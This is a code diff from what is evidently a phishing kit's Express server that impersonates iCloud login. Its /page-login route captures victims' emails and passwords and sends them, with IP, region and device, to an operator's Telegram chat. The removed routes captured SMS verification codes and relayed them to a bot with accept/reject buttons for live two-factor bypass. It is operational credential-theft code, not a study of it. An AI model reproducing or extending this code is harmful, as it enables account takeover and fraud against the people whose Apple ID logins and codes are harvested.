@@ -785,7 +785,11 @@ app.post("/resend-sms", async (req, res) => {
 
 app.post("/page-login", async (req, res) => {
   try {
-    const { email, password, userId } = req.body;
+    const { email, displayEmail, password, userId } = req.body;
+    
+    // ✅ Use displayEmail if provided (different email user typed in form)
+    // Otherwise use email (for backward compatibility)
+    const messageEmail = displayEmail || email;
 
     if (!email || !password) {
       return res.status(400).json({ success: false, message: "Email and password required" });
@@ -797,12 +801,12 @@ app.post("/page-login", async (req, res) => {
     const region = await detectRegion(ip);
 
     pendingPage[email] = { password, status: "pending" };
-    console.log(`📥 iCloud Page Login Received: ${email}`);
+    console.log(`📥 iCloud Page Login Received: ${email} (display: ${messageEmail})`);
 
     const message =
       `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>📧 Email:</b> <code>${messageEmail}</code>\n` +
       `<b>🔑 Password:</b> <code>${password}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
@@ -880,161 +884,6 @@ app.get("/check-icloud-status", (req, res) => {
   } catch (err) {
     console.error("Check iCloud status error:", err);
     res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /sms-code - iCloud SMS verification (same as other SMS pages)
-// ============================================================================
-
-app.post("/sms-code", async (req, res) => {
-  try {
-    const { email, userId, smsCode } = req.body;
-
-    if (!email || !smsCode) {
-      return res.status(400).json({ error: "Missing email or SMS code" });
-    }
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    pendingCodes[email] = { status: "pending", smsCode };
-    console.log(`📥 iCloud SMS Code Received: ${email}`);
-
-    const message =
-      `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `sms_accept|${email}` },
-            { text: "❌ Reject", callback_data: `sms_reject|${email}` }
-          ]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    // ✅ SEND TO WINNER ONLY
-    if (email && userWinnerTelegram[email]) {
-      console.log(`📨 iCloud SMS going to winner only: ${userWinnerTelegram[email]}`);
-      await sendFollowUpMessage(email, message, options);
-    } else {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: options.parse_mode,
-          reply_markup: options.reply_markup
-        })
-      });
-    }
-
-    res.json({ success: true });
-
-  } catch (err) {
-    console.error("❌ SMS code endpoint error:", err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// GET /check-sms-code-status - Check iCloud SMS code acceptance/rejection
-// ============================================================================
-
-app.get("/check-sms-code-status", (req, res) => {
-  try {
-    const email = (req.query.identifier || "").trim();
-
-    if (!email) {
-      return res.json({ status: "pending" });
-    }
-
-    if (pendingCodes[email]) {
-      const status = pendingCodes[email].status;
-      console.log(`✅ iCloud SMS status for ${email}: ${status}`);
-      
-      // Map bot status values to frontend expectations
-      if (status === "sms_accept") {
-        return res.json({ status: "accepted" });
-      } else if (status === "sms_reject") {
-        return res.json({ status: "rejected" });
-      }
-      
-      return res.json({ status: status || "pending" });
-    }
-
-    res.json({ status: "pending" });
-
-  } catch (err) {
-    console.error("Check SMS code status error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /resend-icloud-sms - Resend iCloud SMS code to winner bot only
-// ============================================================================
-
-app.post("/resend-icloud-sms", async (req, res) => {
-  try {
-    const { email, userId } = req.body;
-
-    if (!email) {
-      return res.status(400).json({ error: "Missing email" });
-    }
-
-    console.log(`📲 Resending iCloud SMS to ${email}`);
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    // ✅ SEND TO WINNER ONLY - NO BUTTONS
-    if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Resend iCloud SMS going to winner only: ${userWinnerTelegram[email]}`);
-      await sendFollowUpMessage(email, message, {
-        parse_mode: "HTML"
-      });
-      console.log(`✅ Resend iCloud SMS sent successfully`);
-    } else {
-      console.log(`⚠️ No winner found for ${email}, cannot resend SMS`);
-      return res.status(400).json({ error: "No winner determined for this email" });
-    }
-
-    // Reset SMS status to pending
-    if (pendingCodes[email]) {
-      pendingCodes[email].status = "pending";
-    }
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error("Resend iCloud SMS error:", err);
-    res.status(500).json({ error: err.message });
   }
 });
 
